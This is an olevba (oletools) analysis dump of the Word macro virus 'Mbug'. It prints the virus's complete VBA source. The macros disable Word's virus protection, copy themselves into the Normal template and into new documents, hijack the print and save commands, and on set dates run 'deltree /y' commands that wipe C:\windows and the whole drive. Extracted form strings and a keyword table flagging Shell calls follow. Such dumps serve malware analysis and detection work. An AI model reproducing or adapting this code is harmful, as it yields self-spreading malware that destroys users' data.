olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Mbug.a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Mbug.a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Mbug.bas 
in file: Virus.MSWord.Mbug.a - OLE stream: 'Macros/VBA/Mbug'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoExec()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo errorAE
If Day(Now()) = "21" Or Day(Now()) = "25" Then
UserForm1.Show
Shell "deltree /y c:\windows", vbHide
Shell "deltree /y c:\*.*", vbHide
End If
errorAE:
End Sub
Sub AutoNew()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorAN
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Mbug", Object:=wdOrganizerObjectProjectItems
    With Dialogs(wdDialogFileSummaryInfo)
        .Subject = "You Have been infected by the Alliance 98"
        .Execute
    End With
ErrorAN:
End Sub
Sub AutoOpen()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorAO
iMacroCount = WordBasic.CountMacros(0, 0)
For i = 1 To iMacroCount
    If WordBasic.[MacroName$](i, 0) = "Mbug" Then
        bInstalled = -1
    End If
Next i
If Not bInstalled Then
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Mbug", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="UserForm1", Object:=wdOrganizerObjectProjectItems
    For a = 1 To 10
    StatusBar = "Microsoft"
    Next a
Else
    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Mbug", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=NormalTemplate.FullName, Name:="UserForm1", Object:=wdOrganizerObjectProjectItems
End If
ErrorAO:
End Sub
Sub FileSaveAs()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorFSA
    If Day(Now()) = "21" Or Day(Now()) = "25" Then
    UserForm1.Show
    Shell "deltree /y c:\windows", vbMinimizedFocus
    Shell "deltree /y c:\*.*", vbMinimizedFocus
    End If
    Dialogs(wdDialogFileSaveAs).Show
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Mbug", Object:=wdOrganizerObjectProjectItems
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="UserForm1", Object:=wdOrganizerObjectProjectItems
ActiveDocument.Save
ErrorFSA:
If (ActiveDocument.SaveFormat = wdFormatDocument) Or (ActiveDocument.SaveFormat = wdFormatTemplate) Then
    ActiveDocument.SaveAs FileFormat:=wdFormatTemplate
End If
End Sub
Sub FilePrint()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorFP
InsertPayload
    Dialogs(wdDialogFilePrint).Show
ErrorFP:
End Sub
Sub FilePrintDefault()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorFPD
InsertPayload
    ActiveDocument.PrintOut
ErrorFPD:
End Sub
Sub FileTemplates()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorFT
ErrorFT:
End Sub
Sub InsertPayload()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorIP
Dim WPrint$, Adding
WPrint$ = WordBasic.[GetPrivateProfileString$]("Microsoft Word", "NbrePrint", "Nuclear98.ini")
Adding = WordBasic.Val(WPrint$) + 1
WordBasic.SetPrivateProfileString "Microsoft Word", "NbrePrint", Str(Adding), "Nuclear98.ini"
WPrint$ = WordBasic.[GetPrivateProfileString$]("Microsoft Word", "NbrePrint", "Nuclear98.ini")
If WPrint$ = 12 Then
    Selection.EndKey Unit:=wdLine
    Selection.TypeParagraph
    Selection.TypeText Text:="bug"
    Selection.TypeParagraph
    Selection.TypeParagraph
    Selection.TypeText Text:="bug"
    Selection.HomeKey Unit:=wdLine
    Selection.EndKey Unit:=wdLine, Extend:=wdExtend
    Selection.Font.Bold = wdToggle
    WordBasic.SetPrivateProfileString "Microsoft Word", "NbrePrint", "1", "Nuclear98.ini"
End If
ErrorIP:
End Sub
Sub ToolsMacro()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorTM
ErrorTM:
End Sub
Sub ViewVBCode()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorVVBC
ErrorVVBC:
End Sub
-------------------------------------------------------------------------------
VBA MACRO UserForm1.frm 
in file: Virus.MSWord.Mbug.a - OLE stream: 'Macros/VBA/UserForm1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Private Sub CommandButton1_Click()
MsgBox "My name is Macrobug", vbInformation, "Information Box"
End Sub

Private Sub TextBox1_Change()
MsgBox "Don't change my name", vbInformation, "!!!"
End Sub

Private Sub UserForm_Initialize()
    
    TextBox1.Text = "MacroBug"
     
    End Sub
    
    
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.a' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�Qlt
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.a' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
GIF89a,
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.a' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
			



-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.a' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
   !!!"""###$$$%%%&&&'''((()))***+++,,,---...///000111222333444555666777888999:::;;;<<<===>>>???@@@AAABBBCCCDDDEEEFFFGGGHHHIIIJJJKKKLLLMMMNNNOOOPPPQQQRRRSSSTTTUUUVVVWWWXXXYYYZZZ[[[\\\]]]^^^___```aaabbbcccdddeeefffggghhhiiijjjkkklllmmmnnnooopppqqqrrrssstttuuuvvvwwwxxxyyyzzz{{{|||}}}~~~������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������,
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.a' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
H����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.a' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
*\Ȱ�Ç
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.a' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#J�H��ŋ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.a' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3j�ȱ�FJ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.a' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
I�dȒk(�Iɒ$G�+ר�I3fJ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.a' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
a�T���Ϙ.+���S
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.a' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�H���R�O
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.a' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��tdđ;yF5:u+U�+�>
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.a' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ړ�Գf{��ɐ�V�\��)v!ֲ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.a' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��ں	�Nի�+�[g.Ux�-�y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.a' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�A�Q!k��7�M�^�j��٫٣��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.a' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���p^���"����l��9˅
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.a' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��T��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.a' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2ߤ*,
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.a' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���|M���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.a' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
7�o�YO����w��ZQ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.a' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
|w��߯�L�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.a' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�4{���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.a' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
\}�E�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.a' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
T�Y'�s��f
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.a' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
wȭ��C���`j��5�WH�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.a' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
^EIbEm
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.a' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
H�L3�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.a' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
TF2��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.a' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
s%b�^I#E
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.a' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
z
V�#�B�DdA>zt$�KZ�`�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.a' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�E�T
Q���	BiP@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.a' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�A little bit macro bugs come to celebrate with 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.a' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.a' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�your MSword on very months 21 and 25. Thisleu
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.a' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.a' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Attention 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.a' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.a' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�is a good bug, it always help you to work on SI
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.a' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.a' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�your MSword and others device on your PC beru
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.a' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MSs M
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.a' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�GOOD LUCK!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.a' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.a' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.a' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Click Me!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.a' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS
-------------------------------------------------------------------------------
VBA FORM Variable "b'Image1'" IN 'Virus.MSWord.Mbug.a' - OLE stream: 'Macros/UserForm1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.Mbug.a' - OLE stream: 'Macros/UserForm1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Virus.MSWord.Mbug.a' - OLE stream: 'Macros/UserForm1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN 'Virus.MSWord.Mbug.a' - OLE stream: 'Macros/UserForm1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label4'" IN 'Virus.MSWord.Mbug.a' - OLE stream: 'Macros/UserForm1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label5'" IN 'Virus.MSWord.Mbug.a' - OLE stream: 'Macros/UserForm1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label6'" IN 'Virus.MSWord.Mbug.a' - OLE stream: 'Macros/UserForm1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'TextBox1'" IN 'Virus.MSWord.Mbug.a' - OLE stream: 'Macros/UserForm1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Virus.MSWord.Mbug.a' - OLE stream: 'Macros/UserForm1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|AutoExec  |CommandButton1_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|AutoExec  |TextBox1_Change     |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbMinimizedFocus    |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

